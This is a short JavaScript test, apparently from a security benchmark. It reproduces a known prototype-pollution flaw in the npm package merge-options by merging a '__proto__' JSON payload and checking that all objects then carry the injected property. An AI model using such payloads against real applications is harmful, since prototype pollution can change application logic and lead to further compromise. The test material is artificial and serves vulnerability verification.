//https://snyk.io/vuln/npm:merge-options:20180415
test("prototype pollution in merge-options", () => {
  const merge = require("merge-options");
  const malicious_payload = process.env.SECBENCH_PAYLOAD || (process.env.SECBENCH_PAYLOAD || '{"__proto__":{"polluted":"yes"}}');
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe("yes");
});
